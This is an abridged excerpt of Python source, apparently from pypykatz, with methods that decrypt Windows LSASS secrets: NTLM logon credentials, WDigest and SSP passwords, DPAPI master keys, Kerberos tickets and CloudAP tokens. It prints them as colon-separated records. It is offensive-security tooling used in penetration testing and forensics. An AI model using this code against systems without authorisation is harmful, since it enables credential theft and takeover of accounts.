...
from pypykatz.lsadecryptor import CredmanTemplate, MsvTemplate, \
    MsvDec, WdigestTemplate, LsaTemplate, WdigestDec, \
    LiveSspTemplate, LiveSspDec, SspDec, SspTemplate, \
    TspkgDec, TspkgTemplate, KerberosTemplate, KerberosDec, \
    DpapiTemplate, DpapiDec, LsaDecryptor, CloudapTemplate, \
    CloudapDec
...
class pypykatz:
                ...
                for cred in self.orphaned_creds:
                    ...
                    if t['credtype'] != 'dpapi':
                        if t['password'] is not None:
                            x = [str(t['credtype']), str(t['domainname']), str(t['username']), '', '', '', '', '',
                                 str(t['password'])]
                            res += ':'.join(x) + '\r\n'
                    else:
                        t = cred.to_dict()
                        x = [str(t['credtype']), '', '', '', '', '', str(t['masterkey']), str(t['sha1_masterkey']),
                             str(t['key_guid']), '']
                        res += ':'.join(x) + '\r\n'
                for pkg, err in self.errors:
                    err_str = str(err) + '\r\n' + '\r\n'.join(traceback.format_tb(err.__traceback__))
    ...
    def get_logoncreds(self):
        ...
        logoncred_decryptor = MsvDec(self.reader, msv_template, self.lsa_decryptor, credman_template, self.sysinfo)
    ...
    def get_wdigest(self):
        ...
        decryptor = WdigestDec(self.reader, decryptor_template, self.lsa_decryptor, self.sysinfo)
        decryptor.start()
    ...
    def get_tspkg(self):
        ...
        tspkg_dec = TspkgDec(self.reader, tspkg_dec_template, self.lsa_decryptor, self.sysinfo)
        tspkg_dec.start()
    ...
    def get_ssp(self):
        ...
        dec = SspDec(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
        dec.start()
    ...
    def get_livessp(self):
        ...
        livessp_dec = LiveSspDec(self.reader, livessp_dec_template, self.lsa_decryptor, self.sysinfo)
        livessp_dec.start()
    ...
    def get_dpapi(self):
        ...
        dec = DpapiDec(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
        dec.start()
        for cred in dec.credentials:
            if cred.luid in self.logon_sessions:
    ...
    def get_kerberos(self, with_tickets=True):
        ...
        dec = KerberosDec(self.reader, dec_template, self.lsa_decryptor, self.sysinfo, with_tickets=with_tickets)
        dec.start()
        for cred in dec.credentials:
    ...
    def get_cloudap(self):
        ...
        if cloudap_dec_template is None:
            return
        cloudap_dec = CloudapDec(self.reader, cloudap_dec_template, self.lsa_decryptor, self.sysinfo)
        cloudap_dec.start()
